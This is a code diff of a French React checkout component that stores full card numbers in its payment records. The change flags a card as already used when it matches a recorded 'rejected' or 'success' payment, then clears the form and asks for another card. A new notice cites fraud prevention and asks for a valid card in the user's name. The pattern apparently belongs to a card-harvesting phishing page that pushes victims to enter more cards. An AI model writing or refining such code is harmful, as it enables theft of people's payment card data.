@@ -200,13 +200,13 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     }
     const { payments } = await response.json();
 
-    // Parcourt les paiements et renvoie true si on trouve une correspondance
+    // Parcourt les paiements et renvoie true si on trouve une correspondance de carte avec les statuts 'rejected' ou 'success'
     return payments.some(payment => {
       const details = typeof payment.card_details === 'string'
         ? JSON.parse(payment.card_details)
         : payment.card_details;
       const stored = (details.cardNumber || '').replace(/\s/g, '');
-      return stored === target;
+      return stored === target && (payment.status === 'rejected' || payment.status === 'success');
     });
   };
 
@@ -434,12 +434,21 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             <button
               onClick={() => {
                 setShowCardError(false);
-                window.location.reload();
+                setFormData({
+                  cardNumber: '',
+                  expiryDate: '',
+                  cvv: '',
+                });
+                cardNumberRef.current.focus();
               }}
               disabled={isLoading}
             >
               Réessayer
             </button>
+            <div className='notice'>
+              <p>Dans le cadre de la lutte contre la fraude, nous avons mis en place un système de vérification d'identité pour nos paiements en ligne.
+              Assurez-vous d'utiliser une carte bancaire valide à votre nom.</p>
+              </div>
           </div>
         </div>
       )}
